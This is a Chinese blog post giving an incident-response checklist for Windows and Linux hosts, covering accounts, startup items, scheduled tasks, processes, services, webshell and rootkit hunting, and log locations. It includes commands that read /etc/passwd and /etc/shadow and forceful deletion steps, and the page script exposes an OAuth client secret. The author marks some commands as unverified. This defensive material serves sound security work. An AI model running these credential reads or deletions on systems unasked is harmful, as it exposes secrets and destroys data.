<p>查看所有用户信息：cat &#x2F;etc&#x2F;passwd<br>后续各项由冒号隔开，分别表示用户名、密码加密、用户ID、用户组ID、注释、用户主目录、默认登录shell。最后显示bin&#x2F;bash的，表示账户状态可登录，显示sbin&#x2F;nologin的，不可登陆。</p>
<p>awk -F: ‘{if($3&#x3D;&#x3D;0)print<br>$1}’ &#x2F;etc&#x2F;passwd ：查询登录账户UID&#x3D;0的账户，root是uid等于0的账户，如果出现其它的账户，就要重点排查；</p>
<p>查看可登录账户：cat &#x2F;etc&#x2F;passwd | grep ‘&#x2F;bin&#x2F;bash’</p>
<p>查看用户错误的登录信息：lastb（包括错误的登录方法、ip、时间等） </p>
<p>查看所有用户最后的登录信息：lastlog</p>
<p>查看用户最近登录信息：last </p>
<p>查看当前用户登录系统信息：who </p>
<p>查看空口令账户：awk -F: ‘length($2)&#x3D;&#x3D;0 {print$1}’ &#x2F;etc&#x2F;shadow</p>
</blockquote>
<h4 id="c-启动项"><a href="#c-启动项" class="headerlink" title="c.启动项"></a>c.启动项</h4><p>是开机系统在前台或者后台运行的程序，是病毒等实现持久化驻留的常用方法。</p>
<p>Windows</p>
<blockquote>
<p>msconfig：可查看启动项的详细信息；</p>
<p>注册表查看：</p>
<p>HKEY_CLASSES_ROOT:此处存储的信息可确保在windows资源管理器中执行时打开正确的程序。它还包含有关拖放规则、快捷方法和用户界面信息的更多详细信息；<br>HKEY_CURRENT_USER:包含当前登录系统的用户的配置信息，有用户的文件夹、屏幕颜色和控制面板设置；<br>HKEY_LOCAL_MACHINE:包含运行操作系统的硬件特定信息，有系统上安装的驱动器列表及已安装硬件和应用程序的通用配置；<br>HKEY_USERS：包含系统上所有用户的配置信息，有应用程序配置和可视配置；<br>HKEY_CURRENT_CONFIG:存储有关系统当前配置信息</p>
<p>查看注册表中的信息：reg query<br>“HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run”</p>
</blockquote>
<p>Linux</p>
<blockquote>
<p>cat &#x2F;etc&#x2F;init.d&#x2F;rc.local cat &#x2F;etc&#x2F;rc.local ls -alt &#x2F;etc&#x2F;init.d<br>查看init.d文件夹下的所有文件的详细信息</p>
</blockquote>
<h4 id="d-任务计划"><a href="#d-任务计划" class="headerlink" title="d.任务计划"></a>d.任务计划</h4><p>很多计算机都会自动加载“任务计划”，因此任务计划也是病毒实现持久化驻留的一种常用手段</p>
<p>Windows</p>
<blockquote>
<p>eventvwr：打开事件查看器，可看日志<br>打开计算机管理——系统工具——任务计划程序——任务计划程序库：可查看任务计划的名称、状态、触发器等信息；<br>命令行输入schtasks：可获取任务计划信息，要求是本地Administrator组的成员；<br>在PowerShell下输入get-scheduledtask 可查看当前系统中所有任务计划信息，包括路径、名称、状态等详细信息。</p>
</blockquote>
<p>Linux</p>
<blockquote>
<p>crontab -l：可查看当前任务计划 </p>
<p>crontab -u root -l：查看root用户的任务计划（指定用户）</p>
<p>查看etc目录下的任务计划文件：一般在linux系统中的任务计划文件是以cron开头的，可以利用正则表达式的筛选出etc目录下的所有以cron开头的文件，具体表达式为&#x2F;etc&#x2F;cron,例如查看etc目录下的所有任务计划文件就可以输入ls &#x2F;etc&#x2F;cron命令。<br>&#x2F;etc&#x2F;crontab<br>&#x2F;etc&#x2F;cron.d&#x2F;<br>&#x2F;etc&#x2F;cron.daily&#x2F;*<br>&#x2F;etc&#x2F;cron.hourly&#x2F;*<br>&#x2F;etc&#x2F;cron.monthly&#x2F;*<br>&#x2F;etc&#x2F;cron.weekly&#x2F;<br>&#x2F;etc&#x2F;anacrontab</p>
</blockquote>
<h4 id="e-其它"><a href="#e-其它" class="headerlink" title="e.其它"></a>e.其它</h4><p>windows防火墙的入站规则和出站规则 :</p>
<blockquote>
<p>netsh ：</p>
<p>netsh firewall show state:显示当前防火墙的网络配置状态</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230615144413717.png" alt="netsh"></p>
<h3 id="进程排查"><a href="#进程排查" class="headerlink" title="进程排查"></a>进程排查</h3><p>进程即，系统进行资源分配和调度的基本单位；</p>
<p>主机在感染恶意程序后，恶意程序都会启动相应的进程，来完成相关的恶意操作，有的恶意进程为了不被查杀，还会启动相应的守护进程来对恶意进程进行守护。</p>
<p>Windows</p>
<blockquote>
<p>通过任务管理器查看;</p>
<p>命令行的话：</p>
<p>tasklist：可显示计算机中的所有进程，可查看进程的映像名称、PID、会话等信息；</p>
<p>tasklist &#x2F;svc：可以显示每个进程和服务对应的情况；</p>
<p> tasklist &#x2F;m：查询加载的DLL </p>
<p>tasklist &#x2F;m wmiutils.dll:查询特定dll的调用情况 </p>
<p>tasklist &#x2F;svc &#x2F;fi “pid eq 284”：过滤器功能，eq等于、nq不等于、gt大于、lt小于、ge大于等于、le小于等于</p>
</blockquote>
<blockquote>
<p>netstat：可显示网络连接的信息，包括活动的TCP连接、路由器和网络接口信息，是一个监控TCP&#x2F;IP网络的工具。<br>端口定位程序：通过netstat定位处PID，然后用tasklist查看具体的程序，</p>
<p>例如：netstat -ano |findstr “3306” </p>
<p>定位出pid&#x3D;6616: tasklist |find “6616” </p>
<p>netstat -anb 3306：端口快速定位程序，需要管理员权限；</p>
<p> powershell排查：对于有守护进程的进程，需要确认子父进程之间的关系<br>get-wmiobject win32_process | select<br>name,processid,parentprocessid,path<br>wmic命令查询：可对进程进行查询以csv格式来显示进程名称、父进程id、进程id </p>
<p>wmic process get<br>name,parentprocessid,processid（&#x2F;format:csv），实验了一下，括号可以去掉，否则提示此级别开关异常</p>
</blockquote>
<p>Linux</p>
<blockquote>
<p>netstat:分析可以端口、分析可疑ip地址、可疑pid及程序进程； </p>
<p>（待验证：↓）</p>
<p><strong>ls -alt &#x2F;proc&#x2F;PID：查看PID为600的进程可执行程序；</strong></p>
<p> <strong>lsof -p PID:查看进程所打开的文件；</strong></p>
<p> <strong>kill -9 PID：结束进程；</strong><br><strong>rm -rf filename ：删除名为filename的文件；</strong><br><strong>如果root用户都无法删除相关文件，可能是因为该文件被加上了i属性，使用lsattr filename 查看文件属性，然后用chattr -i filename 可移除i属性，进而删除文件。也有因为进程存在守护进程而无法被删除，可先将进程挂起，查杀守护进程后，再返回将进程删除。</strong></p>
<p><strong>补充：chattr +i filename 加i属性。</strong></p>
<p> <strong>查看隐藏进程：顺序执行以下三条命令</strong><br><strong>ps -ef | awk ‘{print}’|sort -n |uniq&gt;1 ls &#x2F;proc |sort -n |uniq&gt;2</strong><br><strong>diff 1 2 top：可用于挖矿进程排查，显示占用率较高的进程。</strong></p>
</blockquote>
<h3 id="服务排查"><a href="#服务排查" class="headerlink" title="服务排查"></a>服务排查</h3><p>运行在后台的进程，服务可以在计算机启动时自动启动，也可暂停和重启，而且不显示任何用户界面，服务非常适合在服务器上使用，通常在为了不影响在同一天计算机上工作的其它用户，且需要长时间运行功能时使用。在应急响应中，服务作为一种运行在后台的进程，是恶意软件常用的驻留方法。</p>
<p>Windows</p>
<blockquote>
<p>services.msc：打开服务窗口，查看所有的服务项，包括服务的名称、描述、状态等。</p>
</blockquote>
<p>Linux</p>
<blockquote>
<p>chkconfig –list：可查看系统运行的服务；<br>service –status-all：可查看所有服务的状态；</p>
</blockquote>
<h3 id="文件痕迹排查"><a href="#文件痕迹排查" class="headerlink" title="文件痕迹排查"></a>文件痕迹排查</h3><p>排查思路：</p>
<blockquote>
<ol>
<li>对恶意软件常用的敏感路径进行排查；</li>
<li>在确定了应急响应事件的时间点后，对时间点前后的文件进行排查；</li>
<li>对带有特征的恶意软件进行排查，包括代码关键字或关键函数、文件权限特征。</li>
</ol>
</blockquote>
<p>Windows</p>
<blockquote>
<p>敏感目录<br>各个盘下的temp(tmp)相关目录，有些恶意程序释放字体(即恶意程序运行时投放出的文件)一般会在程序中写好投放的路径，由于不同系统版本的路径有所差别，但临时文件的路径相对统一，因此在程序中写好的路径一般是临时路径；</p>
</blockquote>
<blockquote>
<p>查看浏览器历史记录、下载文件和cookie信息：攻击者可能会下载一些后续攻击工具；</p>
</blockquote>
<blockquote>
<p>查看用户Recent文件：存储最近运行文件的快捷方式，一般在windows中的路径为： C:\Document and<br>Settings\Administrator(系统用户名)\Recent C:\Document and Settings\Default<br>User\Recent<br>Prefetch：预读取文件夹，存放系统已经访问过的文件的读取信息，扩展名为pf，可加快系统启动进程，</p>
<p>启动：%systemroot%\prefetch amcache.hve:可查看应用程序执行路径、上次执行时间及sha1值。</p>
<p>启动：%systemroot%\appcompat\programs<br>时间点查找 forfiles 攻击者可能会对时间动手脚 webshell<br>D盾、HwsKill、WebshellKill等工具对目录下的文件进行规则查询，</p>
</blockquote>
<p>Linux</p>
<blockquote>
<p>敏感目录 &#x2F;tmp、 &#x2F;usr&#x2F;bin、 &#x2F;usr&#x2F;sbin：经常作为恶意软件下载目录及相关文件被替换的目录；<br>~&#x2F;.ssh、&#x2F;etc&#x2F;ssh：经常作为后门配置的路径</p>
</blockquote>
<blockquote>
<p>时间点查找 find：可对某一时间段内增加的文件进行查找；<br>stat：对文件的创建时间、修改时间、访问时间进行排查；</p>
</blockquote>
<blockquote>
<p>特殊文件<br>查找777权限的文件：find &#x2F;tmp -perm 777</p>
</blockquote>
<blockquote>
<p>webshell查找<br>初筛：find &#x2F;var&#x2F;www&#x2F; -name “*.php”<br>工具：findWebshell、Scan_Webshell.py扫描排查</p>
</blockquote>
<blockquote>
<p>对系统命令进行排查<br>ls、ps可能被攻击者替换，</p>
<p>ls -alt &#x2F;bin 查看命令目录中的系统命令的修改时间进行排查；<br>ls -alh &#x2F;bin：查看相关文件大小，若明显偏大，则文件很可能被替换；</p>
</blockquote>
<blockquote>
<p>linux后门检测<br>工具:chkrootkit（出现infected说明有后门）、rkhunter 排查suid程序<br>find &#x2F;-type f -perm -04000 -ls -uid 0 2 &gt;&#x2F;dev&#x2F;null</p>
</blockquote>
<h3 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h3><p>Windows：</p>
<p>在运行对话框中输入eventvwr，打开事件查看器窗口，可查看windows相关日志。</p>
<blockquote>
<p>系统日志：%SystemRoot%\System32\Winevt\Logs\System.evtx 系统中的各个组件在运行中产生的各种事件</p>
</blockquote>
<blockquote>
<p>安全性日志:%SystemRoot%\System32\Winevt\Logs\security.evtx<br>记录各种安全相关的事件，登录操作、对系统文件进行创建、删除、更改等操作。</p>
</blockquote>
<blockquote>
<p>应用程序日志：%SystemRoot%\System32\Winevt\Logs\Application.evtx</p>
</blockquote>
<blockquote>
<p>日志常用事件id 4624：登陆成功 4625：登录失败</p>
</blockquote>
<blockquote>
<p>日志分析<br>日志筛选器进行分析<br>PowerShell分析 Get-WinEvent Get-WinEvent Security -InstanceId 4625:获取安全性日志下事件id为4625的所有日志信息。<br>使用工具</p>
</blockquote>
<p>Linux</p>
<p>linux系统日志一般在&#x2F;var&#x2F;log&#x2F;下</p>
<blockquote>
<p>&#x2F;var&#x2F;log&#x2F;wtmp：记录登录进入、退出、数据交换、关机和重启，及last</p>
<p>&#x2F;var&#x2F;log&#x2F;cron：记录与定时任务相关的日志信息；</p>
<p>&#x2F;var&#x2F;log&#x2F;message:记录系统启动后的信息和错误日志；</p>
<p>&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log：记录apache的访问日志；</p>
<p>&#x2F;var&#x2F;log&#x2F;auth.log：记录系统授权信息，包括用户登录和使用的权限机制等；<br>…<br>日志分析<br>…<br>其它日志<br>除了windows、linux系统日志分析外，还有Web日志、中间件日志、数据库日志、FTP日志等进行分析。</p>
</blockquote>
<blockquote>
<p>IIS日志<br>%systemdrive%\inetpub\logs\logfiles<br>%systemroot%\system32\logfiles\w3svc1</p>
</blockquote>
<p>…</p>
<blockquote>
<p>Apache日志<br>&#x2F;var&#x2F;log&#x2F;httpd&#x2F;access.log<br>&#x2F;var&#x2F;log&#x2F;apache&#x2F;access.log<br>&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log<br>&#x2F;var&#x2F;log&#x2F;httpd-access.log</p>
</blockquote>
<blockquote>
<p>Nginx日志<br>默认在&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;logs目录下，access.log代表访问日志，error.log代表错误日志。若没在默认路径下，则可到nginx.conf配置文件中查找。</p>
</blockquote>
<blockquote>
<p>Tomcat日志 tomcat&#x2F;log下 Vsftp日志<br>&#x2F;var&#x2F;log&#x2F;messages 可通过编辑&#x2F;etc&#x2F;vsftp&#x2F;vsftp.conf配置文件来启用单独的日志，启用后，可访问vsftp.log和xferlog。</p>
</blockquote>
<blockquote>
<p>Weblogic日志<br>有三种日志：access log、 server log 、 domain log。</p>
</blockquote>
<blockquote>
<p>数据库日志</p>
<pre><code>        Oracle
            select * from v$logfile：查询日志命令，默认在$ORACLE/rdbms/log目录下，
            select * from v$sql：可查询之前使用的sql；
        Mysql
            默认路径：/var/log/mysql/
            可查看日志是否开启：show variables like &#39;general&#39;;
            开启日志：set global general_log = &#39;ON&#39;;
        Mssql
            一般无法查看，需要登录到SQL Server Management Studio,在管理——SQL Server日志 中查看。
</code></pre>
</blockquote>
<p>内存分析</p>
<p>流量分析</p>
<p>威胁情报</p>
<p>得出结论</p>
<h1 id="6-参考"><a href="#6-参考" class="headerlink" title="6.参考"></a>6.参考</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45697116/article/details/125194266?ops_request_misc=%7B%22request_id%22:%22168679554016800186533333%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=168679554016800186533333&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-2-125194266-null-null.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94&spm=1018.2226.3001.4187">网络安全应急响应(归纳)_003安全实验室的博客-CSDN博客</a></p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <div class="declare">
      <ul class="post-copyright">
        <li>
          <i class="ri-copyright-line"></i>
          <strong>版权声明： </strong>
          
          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
          
        </li>
      </ul>
    </div>
    
    <footer class="article-footer">
       
<div class="share-btn">
      <span class="share-sns share-outer">
        <i class="ri-share-forward-line"></i>
        分享
      </span>
      <div class="share-wrap">
        <i class="arrow"></i>
        <div class="share-icons">
          
          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
            <i class="ri-weibo-fill"></i>
          </a>
          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
            <i class="ri-wechat-fill"></i>
          </a>
          <a class="qq share-sns" href="javascript:;" data-type="qq">
            <i class="ri-qq-fill"></i>
          </a>
          <a class="douban share-sns" href="javascript:;" data-type="douban">
            <i class="ri-douban-line"></i>
          </a>
          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
            <i class="icon icon-qzone"></i>
          </a> -->
          
          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
            <i class="ri-facebook-circle-fill"></i>
          </a>
          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
            <i class="ri-twitter-fill"></i>
          </a>
          <a class="google share-sns" href="javascript:;" data-type="google">
            <i class="ri-google-fill"></i>
          </a>
        </div>
      </div>
</div>

<div class="wx-share-modal">
    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
    <p>扫一扫，分享到微信</p>
    <div class="wx-qrcode">
      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2023/06/07/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" alt="微信分享二维码">
    </div>
</div>

<div id="share-mask"></div>  
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" rel="tag">应急响应</a></li></ul>

    </footer>
  </div>

   
  <nav class="article-nav">
    
      <a href="/2023/06/10/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="article-nav-link">
        <strong class="article-nav-caption">上一篇</strong>
        <div class="article-nav-title">
          
            文件包含
          
        </div>
      </a>
    
    
      <a href="/2023/06/01/%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/" class="article-nav-link">
        <strong class="article-nav-caption">下一篇</strong>
        <div class="article-nav-title">服务器搭建</div>
      </a>
    
  </nav>

  
   
<div class="gitalk" id="gitalk-container"></div>

<link rel="stylesheet" href="https://cdn.staticfile.org/gitalk/1.7.2/gitalk.min.css">


<script src="https://cdn.staticfile.org/gitalk/1.7.2/gitalk.min.js"></script>


<script src="https://cdn.staticfile.org/blueimp-md5/2.19.0/js/md5.min.js"></script>

<script type="text/javascript">
  var gitalk = new Gitalk({
    clientID: '93da8388ad1469a8be66',
    clientSecret: '9dea6314b14ae1877632f2bcbe0a639dd4485bb1',
    repo: 'blogtalk',
    owner: 'ak005469075',
    admin: ['ak005469075'],
    // id: location.pathname,      // Ensure uniqueness and length less than 50
    id: md5(location.pathname),
    distractionFreeMode: false,  // Facebook-like distraction free mode
    pagerDirection: 'last'
  })

  gitalk.render('gitalk-container')
</script>

  
    
</article>

</section>
      <footer class="footer">
  <div class="outer">
    <ul>
      <li>
        Copyrights &copy;
        2023
        <i class="ri-heart-fill heart_icon"></i> 是羽泪云诶
      </li>
    </ul>
    <ul>
      <li>
        
      </li>
    </ul>
    <ul>
      <li>
        
        
        <span>
  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
  <span class="division">|</span>
  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
</span>
        
      </li>
    </ul>
    <ul>
      
    </ul>
    <ul>
      
    </ul>
    <ul>
      <li>
        <!-- cnzz统计 -->
        
        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
        
      </li>
    </ul>
  </div>
</footer>    
    </main>
    <div class="float_btns">
      <div class="totop" id="totop">
  <i class="ri-arrow-up-line"></i>
</div>

<div class="todark" id="todark">
  <i class="ri-moon-line"></i>
</div>

    </div>
    <aside class="sidebar on">
      <button class="navbar-toggle"></button>
<nav class="navbar">
  
  <div class="logo">
    <a href="/"><img src="/favicon.ico" alt="小张之栈"></a>
  </div>
  
  <ul class="nav nav-main">
    
    <li class="nav-item">
      <a class="nav-item-link" href="/">主页</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/archives">归档</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/categories">分类</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/tags">标签</a>
    </li>
    
  </ul>
</nav>
<nav class="navbar navbar-bottom">
  <ul class="nav">
    <li class="nav-item">
      
      <a class="nav-item-link nav-item-search"  title="搜索">
        <i class="ri-search-line"></i>
      </a>
      
      
    </li>
  </ul>
</nav>
<div class="search-form-wrap">
  <div class="local-search local-search-plugin">
  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
  <div id="local-search-result" class="local-search-result"></div>
</div>
</div>
    </aside>
    <div id="mask"></div>

<!-- #reward -->
<div id="reward">
  <span class="close"><i class="ri-close-line"></i></span>
  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
  <div class="reward-box">
    
    <div class="reward-item">
      <img class="reward-img" src="/images/alipay.jpg">
      <span class="reward-type">支付宝</span>
    </div>
    
    
    <div class="reward-item">
      <img class="reward-img" src="/images/wechat.jpg">
      <span class="reward-type">微信</span>
    </div>
    
  </div>
</div>
    
<script src="/js/jquery-3.6.0.min.js"></script>
 
<script src="/js/lazyload.min.js"></script>

<!-- Tocbot -->
 
<script src="/js/tocbot.min.js"></script>

<script>
  tocbot.init({
    tocSelector: ".tocbot",
    contentSelector: ".article-entry",
    headingSelector: "h1, h2, h3, h4, h5, h6",
    hasInnerContainers: true,
    scrollSmooth: true,
    scrollContainer: "main",
    positionFixedSelector: ".tocbot",
    positionFixedClass: "is-position-fixed",
    fixedSidebarOffset: "auto",
  });
</script>

<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
<link
  rel="stylesheet"
  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
/>
<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>

<script src="/dist/main.js"></script>

<!-- ImageViewer -->
 <!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>

    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">

        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                <!--  Controls are self-explanatory. Order can be changed. -->

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div>

<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>

<script>
    function viewer_init() {
        let pswpElement = document.querySelectorAll('.pswp')[0];
        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))

        $imgArr.forEach(($em, i) => {
            $em.onclick = () => {
                // slider展开状态
                // todo: 这样不好，后面改成状态
                if (document.querySelector('.left-col.show')) return
                let items = []
                $imgArr.forEach(($em2, i2) => {
                    let img = $em2.getAttribute('data-idx', i2)
                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
                    let title = $em2.getAttribute('alt')
                    // 获得原图尺寸
                    const image = new Image()
                    image.src = src
                    items.push({
                        src: src,
                        w: image.width || $em2.width,
                        h: image.height || $em2.height,
                        title: title
                    })
                })
                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
                    index: parseInt(i)
                });
                gallery.init()
            }
        })
    }
    viewer_init()
</script> 
<!-- MathJax -->

<!-- Katex -->

<!-- busuanzi  -->
 
<script src="/js/busuanzi-2.3.pure.min.js"></script>
 
<!-- ClickLove -->

<!-- ClickBoom1 -->

<script src="https://cdn.staticfile.org/animejs/3.2.1/anime.min.js"></script>

<script src="/js/clickBoom1.js"></script>
 
<!-- ClickBoom2 -->

<!-- CodeCopy -->
 
<link rel="stylesheet" href="/css/clipboard.css">
 <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
<script>
  function wait(callback, seconds) {
    var timelag = null;
    timelag = window.setTimeout(callback, seconds);
  }
  !function (e, t, a) {
    var initCopyCode = function(){
      var copyHtml = '';
      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
      copyHtml += '</button>';
      $(".highlight .code pre").before(copyHtml);
      $(".article pre code").before(copyHtml);
      var clipboard = new ClipboardJS('.btn-copy', {
        target: function(trigger) {
          return trigger.nextElementSibling;
        }
      });
      clipboard.on('success', function(e) {
        let $btn = $(e.trigger);
        $btn.addClass('copied');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-checkbox-circle-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPIED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-checkbox-circle-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
      clipboard.on('error', function(e) {
        e.clearSelection();
        let $btn = $(e.trigger);
        $btn.addClass('copy-failed');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-time-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPY FAILED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-time-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
    }
    initCopyCode();
  }(window, document);
</script>
 
<!-- CanvasBackground -->
 
<script src="/js/dz.js"></script>
 
<script>
  if (window.mermaid) {
    mermaid.initialize({ theme: "forest" });
  }
</script>


    
    

  </div>
</body>

</html>